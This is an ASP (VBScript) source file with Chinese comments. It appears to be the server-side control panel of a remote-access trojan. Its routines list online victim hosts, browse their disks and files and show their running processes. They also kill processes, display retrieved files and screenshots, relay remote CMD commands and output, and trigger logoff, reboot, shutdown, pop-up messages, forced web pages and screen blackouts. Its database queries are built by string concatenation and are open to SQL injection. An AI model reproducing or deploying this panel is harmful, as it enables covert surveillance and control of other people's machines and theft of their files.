<%

'<><>获取在线主机列表<><><>
sub HOST_LIST()
   dim hosts
   set rs=conn.execute("select * from host order by id desc")
       do while not rs.eof
	      if datediff("s",rs("update_time"),now())<=4 then
	      hosts = hosts & "<div class='item' id='"&rs("id")&"' macMD5='"&rs("macMD5")&"'><a href='javascript:void(0);'>&nbsp;广东 广州 天河区<br /><span>("&rs("ip")&")</span></a></div>"
		  end if
       rs.movenext
       loop
   set rs=nothing
   '//没有在线主机
   if hosts="" then
      session("host_id")=""
      session("host_md5")=""
   end if
   response.Write ToJSON("HOST_LIST",hosts)
end sub



'<><>获取当前主机信息<><><>
sub HOST_INFO(id)
    dim info
    if id<>"" and isnumeric(id)=false and (session("host_id")<>"" and isnumeric(session("host_id"))) then id = session("host_id")
	if id<>"" and isnumeric(id) then
	   set rs=conn.execute("select * from host where id="&id&" order by id desc")
		   if not rs.eof then
			  session("host_id")  = rs("id")
			  session("host_md5") = rs("macMD5")
			  navpath = rs("navpath")
			  info = "macMD5"":"""&rs("macMD5")&""",""navpath"":"""&back_path(navpath,3)&""",""navpath_link"":"""&back_path(navpath,2)&""",""hostinfo"":""MAC:"&rs("mac")&"<br>HOST:"&rs("host")&" <b>("&rs("serkey")&")</b>"
		   end if
	   set rs=nothing
	end if
	response.Write "{""CMD"":""HOST_INFO"","""&info&"""}"
end sub



'<><>获取硬盘信息<><><>
sub GET_DISK()
   macMD5 = HOST_MD5()
   set rs=conn.execute("select top 1 * from cmd where macMD5='"&macMD5&"' and CMD='GET_DISK' order by updatetime desc")
	   if not rs.eof then
		  disk = rs("cmdBACK")
		  disks= split(disk,"\")
		  if ubound(disks)>0 then
			 for i=0 to ubound(disks)-1
			   diskstr = disks(i)
			   if diskstr<>"" then
				 diskitems = diskitems & "<li><a href='javascript:void(0);' class='disk' CMD='GET_RPATH' KEY1='"&back_path(diskstr,0)&"' KEY2='0'><div class='ico'>&nbsp;</div><div class='item_name'>"&diskstr&"</div></a></li>"
			   end if
			 next
		  end if
	   end if
   set rs=nothing
   if diskitems<>"" then
	  diskitems = "<div id='window_files'>"&diskitems&"</div>"
	  response.Write ToJSON("GET_DISK",diskitems)
   else
	  response.Write ToJSON("STAT_MSG",LANG_NO_DISK)
   end if
end sub 


'<><>任务管理器<><><>
sub TASK_LIST()
   macMD5 = HOST_MD5()
    set rs=conn.execute("select top 1 * from cmd where macMD5='"&macMD5&"' and CMD='TASK_LIST' order by updatetime desc")
	   if not rs.eof then
		  '更新目录信息
		  conn.execute("update host set navpath='"&PATH&"' where macMD5='"&macMD5&"'")
		  cmdBACK = rs("cmdBACK")
		  cmdBACKs=split(cmdBACK,"|")
		  if ubound(cmdBACKs)>1 then
			 for i=1 to ubound(cmdBACKs)
				 taskitemArr=split(cmdBACKs(i),",")
				 if ubound(taskitemArr)=1 then
					backstr=backstr&"<li id='TASK_"&taskitemArr(0)&"'><a href='javascript:void(0);' CMD='TASK_KILL' KEY1='"&taskitemArr(1)&"' KEY2='"&taskitemArr(0)&"''><span class='name'>"&taskitemArr(0)&" . "&taskitemArr(1)&"</span> <span class='del'>&times;</span></a></li>"
				 end if
			 next
		  end if
	   end if
    set rs=nothing
    if backstr<>"" then
	  backstr = "<div id='window_tasklist'><div class='box'>"&backstr&"<div class='clear'>&nbsp;</div></div></div>"
	  response.Write ToJSON("TASK_LIST",backstr)
    else
	  response.Write ToJSON("STAT_MSG",LANG_TASK_FALSE)
    end if
end sub


'<><>杀死任务进程<><><>
sub TASK_KILL(ID,BACK)
	macMD5 = HOST_MD5()
	if ID<>"0" and ID<>"" and isnumeric(ID) and BACK<>"0" then
	   response.Write ToJSON("TASK_KILL",ID)
    else
	   response.Write ToJSON("ERR_MSG",replace(LANG_TASK_DEL_FALSE,"{ID}",ID))
	end if
end sub



'<><>获取指定目录信息<><><>
sub GET_RPATH(PATH)
   macMD5 = HOST_MD5()
   set rs=conn.execute("select top 1 * from cmd where macMD5='"&macMD5&"' and CMD='GET_RPATH' order by updatetime desc")
	   if not rs.eof then
		  '更新目录信息
		  session("host_path") = PATH
		  conn.execute("update host set navpath='"&PATH&"' where macMD5='"&macMD5&"'")
		  cmdBACK = rs("cmdBACK")
		  
		  cmdBACKs=split(cmdBACK,"{:}")
		  if ubound(cmdBACKs)=1 then
			 '//解析目录
			 folder_items=split(cmdBACKs(0),"|")
			 if ubound(folder_items)>0 then
				for i=1 to ubound(folder_items)
					folderitem=split(folder_items(i),",")
					backstr=backstr&"<li><a href='javascript:void(0);' class='folder' CMD='GET_RPATH' KEY1='"&PATH&"\\"&folderitem(0)&"' KEY2='0' title='"&folderitem(0)&"'><div class='ico'>&nbsp;</div><div class='item_name'>"&folderitem(0)&"</div></a></li>"
				next
			 end if
			 '//解析文件
			 file_items=split(cmdBACKs(1),"|")
			 if ubound(file_items)>0 then
				for i=1 to ubound(file_items)
					fileitem=split(file_items(i),",")
					backstr=backstr&"<li><a href='javascript:void(0);' class='file "&file_ext(fileitem(0))&"' CMD='GET_RFILE' KEY1='"&PATH&"\\"&fileitem(0)&"' KEY2='0' title='名称:"&fileitem(0)&"&#13大小:"&FormatSize(fileitem(1))&"'><div class='ico'>&nbsp;</div><div class='item_name'>"&fileitem(0)&"</div></a></li>"
				next
			 end if
		  end if
	   end if
   set rs=nothing
   if backstr<>"" then
	  backstr = "<div id='window_files'>"&backstr&"</div>"
	  response.Write ToJSON("GET_RPATH",backstr)
   else
	  response.Write ToJSON("STAT_MSG",LANG_NO_PATH)
   end if
end sub



'<><>获取指定目录信息<><><>
sub GET_RFILE(PATH,PATH2)
    '//判断文件类型，执行不同操作
	CONTENT=""
	fileext=file_ext(PATH)
	select case fileext
	       case "txt","bat","asp","php","htm","html","js","ini"
		        CONTENT="<pre>"&FSOFileRead("myload/"&PATH2)&"</pre>"
		   case "gif","jpg","png","bmp"
		        CONTENT="<div style='text-align:center'><img src=""myload/"&PATH2&""" width=""98%"" /></div><br/>"
		   case else
		        CONTENT="<pre>文件："&PATH&"获取成功!</pre>"
	end select
    response.Write ToJSON("GET_RFILE",CONTENT)
end sub


'<><>截取屏幕<><><>
sub GET_SCREEN(PATH)
	CONTENT=""
	fileext=file_ext(PATH)
	select case fileext
		   case "gif","jpg","png","bmp"
		        CONTENT="<div style='text-align:center'><img src=""myload/"&PATH&""" width=""98%"" /></div><br/>"
		   case else
		        CONTENT="截屏可能失败!"
	end select
	response.Write ToJSON("GET_SCREEN",CONTENT)
end sub



'<><>注销<><><>
sub SYS_LOGOFF()
    response.Write ToJSON("SYS_LOGOFF",LANG_BOOT_LOGOFF)
end sub
'<><>重启<><><>
sub SYS_REBOOT()
    response.Write ToJSON("SYS_REBOOT",LANG_BOOT_REBOOT)
end sub
'<><>关机<><><>
sub SYS_SHUTDOWN()
    response.Write ToJSON("SYS_SHUTDOWN",LANG_BOOT_SHUTDOWN)
end sub

'<><>运行CMD命令<><><>
sub RUN_CMD(CMD,BACK)
    response.Write ToJSON("RUN_CMD","<div id='window_cmd'><div id='window_cmd_box'><span>Microsoft Windows XP [版本 5.1.2600] <br> (C) 版权所有 1985-2001 Microsoft Corp.!</span><br><br><span>■ "&CMD&"</span>"&chr(10)&chr(13)&"<pre>"&BACK&"</pre></div></div><br>")
end sub
'<><>打开网页<><><>
sub OPEN_WEB(URL)
    response.Write ToJSON("OPEN_WEB",LANG_OPEN_WEB_TIP&URL)
end sub
'<><>弹出消息<><><>
sub OPEN_MSG(MSG)
    response.Write ToJSON("OPEN_MSG",LANG_OPEN_MSG_TIP&MSG)
end sub
'<><>黑屏<><><>
sub TO_BLACK()
    response.Write ToJSON("TO_BLACK",LANG_TO_BLACK_TIP)
end sub

%>